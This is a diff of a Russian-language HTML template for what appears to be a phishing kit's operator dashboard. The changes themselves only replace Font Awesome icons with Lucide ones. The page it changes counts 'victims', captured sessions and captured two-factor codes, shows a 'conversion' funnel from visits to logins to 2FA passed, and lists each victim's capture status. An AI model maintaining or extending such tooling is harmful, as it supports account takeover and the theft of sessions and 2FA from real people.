@@ -26,7 +26,7 @@
   <div class="rounded-xl p-4" style="background:var(--panel-card);border:1px solid var(--panel-border);">
     <div class="flex items-center justify-between mb-2">
       <span class="text-xs font-medium uppercase tracking-wider" style="color:var(--panel-muted);">Всего</span>
-      <i class="fa-solid fa-users text-sm" style="color:var(--panel-accent2);"></i>
+      <i data-lucide="users" class="w-4 h-4" style="color:var(--panel-accent2);"></i>
     </div>
     <div class="text-2xl font-bold" style="color:var(--panel-text);">{{ total }}</div>
     <div class="text-xs mt-1" style="color:var(--panel-muted);">на этой странице: {{ total_victims }}</div>
@@ -34,7 +34,7 @@
   <div class="rounded-xl p-4" style="background:var(--panel-card);border:1px solid var(--panel-border);">
     <div class="flex items-center justify-between mb-2">
       <span class="text-xs font-medium uppercase tracking-wider" style="color:var(--panel-muted);">Сессии</span>
-      <i class="fa-solid fa-key text-sm" style="color:#fbbf24;"></i>
+      <i data-lucide="key" class="w-4 h-4" style="color:#fbbf24;"></i>
     </div>
     <div class="text-2xl font-bold" style="color:#fbbf24;">{{ session_captured }}</div>
     <div class="text-xs mt-1" style="color:var(--panel-muted);">session captured</div>
@@ -42,7 +42,7 @@
   <div class="rounded-xl p-4" style="background:var(--panel-card);border:1px solid var(--panel-border);">
     <div class="flex items-center justify-between mb-2">
       <span class="text-xs font-medium uppercase tracking-wider" style="color:var(--panel-muted);">2FA Захвачено</span>
-      <i class="fa-solid fa-shield-halved text-sm" style="color:var(--panel-accent);"></i>
+      <i data-lucide="shield" class="w-4 h-4" style="color:var(--panel-accent);"></i>
     </div>
     <div class="text-2xl font-bold" style="color:var(--panel-accent);">{{ twofa_passed }}</div>
     <div class="text-xs mt-1" style="color:var(--panel-muted);">2fa_passed</div>
@@ -50,7 +50,7 @@
   <div class="rounded-xl p-4" style="background:var(--panel-card);border:1px solid var(--panel-border);">
     <div class="flex items-center justify-between mb-2">
       <span class="text-xs font-medium uppercase tracking-wider" style="color:var(--panel-muted);">Конверсия</span>
-      <i class="fa-solid fa-chart-line text-sm" style="color:var(--panel-accent2);"></i>
+      <i data-lucide="trending-up" class="w-4 h-4" style="color:var(--panel-accent2);"></i>
     </div>
     <div class="text-2xl font-bold" style="color:var(--panel-accent2);">
       {% if total_victims > 0 %}{{ "%.1f"|format(logged_in_count / total_victims * 100) }}%{% else %}0%{% endif %}
@@ -66,21 +66,21 @@
   <h3 class="text-sm font-semibold mb-4 uppercase tracking-wider" style="color:var(--panel-muted);">Воронка конверсий</h3>
   <div class="flex items-center gap-2 flex-wrap">
     {% set funnel = [
-      ('fa-eye', 'Визиты', visited_count, '#94a3b8'),
-      ('fa-paper-plane', 'Код отправлен', code_sent_count, '#60a5fa'),
-      ('fa-right-to-bracket', 'Вошли', logged_in_count, '#34d399'),
-      ('fa-shield-halved', '2FA', twofa_passed, '#10b981')
+      ('eye', 'Визиты', visited_count, '#94a3b8'),
+      ('send', 'Код отправлен', code_sent_count, '#60a5fa'),
+      ('log-in', 'Вошли', logged_in_count, '#34d399'),
+      ('shield', '2FA', twofa_passed, '#10b981')
     ] %}
     {% for icon, label, count, color in funnel %}
     <div class="flex-1 min-w-[120px] rounded-lg p-3 text-center" style="background:rgba(255,255,255,0.03);border:1px solid var(--panel-border);">
-      <i class="fa-solid {{ icon }} mb-1" style="color:{{ color }};"></i>
+      <i data-lucide="{{ icon }}" class="w-4 h-4 mb-1 inline-block" style="color:{{ color }};"></i>
       <div class="text-lg font-bold" style="color:{{ color }};">{{ count }}</div>
       <div class="text-xs" style="color:var(--panel-muted);">{{ label }}</div>
       {% if visited_count > 0 and count != visited_count %}
       <div class="text-xs mt-1 font-medium" style="color:{{ color }};">{{ "%.0f"|format(count / visited_count * 100) }}%</div>
       {% endif %}
     </div>
-    {% if not loop.last %}<i class="fa-solid fa-chevron-right" style="color:var(--panel-border);"></i>{% endif %}
+    {% if not loop.last %}<i data-lucide="chevron-right" class="w-4 h-4" style="color:var(--panel-border);"></i>{% endif %}
     {% endfor %}
   </div>
 </div>
@@ -132,16 +132,16 @@
           </td>
           <td class="px-5 py-3 text-center">
             {% if v.session_captured %}
-            <i class="fa-solid fa-check" style="color:var(--panel-accent);"></i>
+            <i data-lucide="check" class="w-4 h-4" style="color:var(--panel-accent);"></i>
             {% else %}
-            <i class="fa-solid fa-xmark" style="color:var(--panel-muted);"></i>
+            <i data-lucide="x" class="w-4 h-4" style="color:var(--panel-muted);"></i>
             {% endif %}
           </td>
           <td class="px-5 py-3 text-center">
             {% if v.status == '2fa_passed' %}
-            <i class="fa-solid fa-check" style="color:var(--panel-accent);"></i>
+            <i data-lucide="check" class="w-4 h-4" style="color:var(--panel-accent);"></i>
             {% else %}
-            <i class="fa-solid fa-xmark" style="color:var(--panel-muted);"></i>
+            <i data-lucide="x" class="w-4 h-4" style="color:var(--panel-muted);"></i>
             {% endif %}
           </td>
           <td class="px-5 py-3 text-xs" style="color:var(--panel-muted);">{{ v.first_visit_at | timestamp_to_date if v.first_visit_at else '—' }}</td>
